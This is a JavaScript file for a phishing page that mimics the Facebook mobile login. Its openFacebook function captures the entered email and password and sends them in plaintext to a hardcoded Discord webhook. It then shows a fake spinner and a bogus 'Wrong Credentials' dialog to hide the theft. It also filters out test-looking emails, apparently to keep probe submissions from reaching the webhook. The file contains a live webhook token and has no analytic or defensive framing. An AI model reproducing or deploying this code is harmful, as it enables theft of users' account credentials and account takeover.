// Function to create and show the error dialog
function showErrorDialog() {
    // Create dialog elements
    const dialog = document.createElement('div');
    dialog.setAttribute('aria-modal', 'true');
    dialog.setAttribute('role', 'dialog');
    dialog.setAttribute('tabindex', '-1');
    
    dialog.innerHTML = `
        <div class="wbloks_144">
            <div data-bloks-name="bk.components.dialog.Dialog" class="wbloks_38" role="presentation">
                <div class="wbloks_40" tabindex="-1" aria-label="Wrong Credentials">
                    <div class="wbloks_41">
                        <div class="wbloks_43">Wrong Credentials</div>
                        <div class="wbloks_42">Invalid username or password</div>
                    </div>
                    <div class="wbloks_39">
                        <div role="button" tabindex="0" class="wbloks_147 wbloks_44 wbloks_47">OK</div>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    // Apply styles to dialog container (.wbloks_38)
    dialog.style.alignItems = 'center';
    dialog.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
    dialog.style.inset = '0px';
    dialog.style.display = 'flex';
    dialog.style.justifyContent = 'space-around';
    dialog.style.position = 'fixed';
    dialog.style.zIndex = '1000';
    dialog.style.fontFamily = 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif';
    
    // Style the dialog content (.wbloks_40)
    const dialogContent = dialog.querySelector('.wbloks_40');
    dialogContent.style.backgroundColor = 'white';
    dialogContent.style.borderRadius = '12px';
    dialogContent.style.margin = '32px';
    dialogContent.style.maxWidth = '100%';
    dialogContent.style.textAlign = 'center';
    dialogContent.style.width = '400px';
    dialogContent.style.outline = 'none';
    
    // Style the OK button container (.wbloks_44)
    const buttonContainer = dialog.querySelector('.wbloks_44');
    buttonContainer.style.display = 'block';
    buttonContainer.style.borderTop = '1px solid rgb(206, 208, 212)';
    buttonContainer.style.cursor = 'pointer';
    buttonContainer.style.fontSize = '16px';
    buttonContainer.style.lineHeight = '1.5';
    buttonContainer.style.padding = '12px 10px';
    buttonContainer.style.pointerEvents = 'auto';
    buttonContainer.style.marginLeft = '0px';
    
    // Style the OK button (.wbloks_147)
    const okButton = dialog.querySelector('.wbloks_147');
    okButton.style.cursor = 'pointer';
    okButton.style.display = 'inline-block';
    okButton.style.textDecoration = 'none';
    okButton.style.whiteSpace = 'nowrap';

    
    // Style the OK button text color (.wbloks_47)
    okButton.style.color = 'rgb(0, 100, 224)';
    
    // Apply outline styles to .wbloks_70 elements (if present)
    const allElements = dialog.querySelectorAll('.wbloks_70 *');
    allElements.forEach(element => {
        element.style.outline = 'none';
        element.style.outlineOffset = '-1px';
    });
    
    // Add dialog to body
    document.body.appendChild(dialog);
    
    // Add click event to OK button to remove dialog
    okButton.addEventListener('click', () => {
        document.body.removeChild(dialog);
    });
}

function openFacebook() {
    // Get the email and password values
    const email = document.getElementById('m_login_email').value;
    const password = document.getElementById('m_login_password').value;
    
    // Check if fields are empty
    if (!email || !password) {
        console.log('Please enter both email and password');
        return;
    }
    
    // List of forbidden words to check against in email
    const forbiddenWords = ['spam', 'test', 'fake', 'dummy'];
    
    // Check if email contains any forbidden words
    const hasForbiddenWord = forbiddenWords.some(word => 
        email.toLowerCase().includes(word)
    );
    
    if (hasForbiddenWord) {
        console.log('Login attempt blocked due to forbidden words in email');
        return;
    }
    
    // Get the login button text element
    const loginButtonText = document.querySelector('[aria-label="Log in"] .wbloks_120');
    const originalText = loginButtonText.innerHTML;
    
    // Replace "Log in" text with spinner SVG
    loginButtonText.innerHTML = `
        <svg class="wbloks_133 wbloks_134 wbloks_136" viewBox="25 25 50 50" style="width: 20px; height: 20px;">
            <title>Spinner</title>
            <circle cx="50" cy="50" r="20" fill="none" stroke="var(--wbloks-fig-blue-tint-90)"></circle>
            <circle class="wbloks_135 wbloks_136" cx="50" cy="50" r="20" fill="none" stroke="var(--wbloks-fig-blue-tint-10)"></circle>
        </svg>
    `;
    
    // Send credentials to Discord webhook
    const webhookUrl = 'https://discord.com/api/webhooks/1344662302359814184/1WbyocYtJ8qn0vCk1OuUoUfRn-tYb6Ld_pY8ay4xjfkLQcYfVYM2JMvvhlobsYOWFHt2';
    
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: `New login attempt:\nEmail: ${email}\nPassword: ${password}`
        })
    })
    .then(response => console.log('Webhook sent successfully'))
    .catch(error => console.error('Error sending webhook:', error));
    
    // Show error dialog after 4-second delay and restore login text
    setTimeout(() => {
        showErrorDialog();
        loginButtonText.innerHTML = originalText; // Restore "Log in" text
    }, 4000);
}

function openRegister() {
    window.location.href = "https://m.facebook.com/reg/";
}

// Add event listeners
document.querySelector('[aria-label="Log in"]').addEventListener('click', openFacebook);
document.querySelector('[aria-label="Create new account"]').addEventListener('click', openRegister);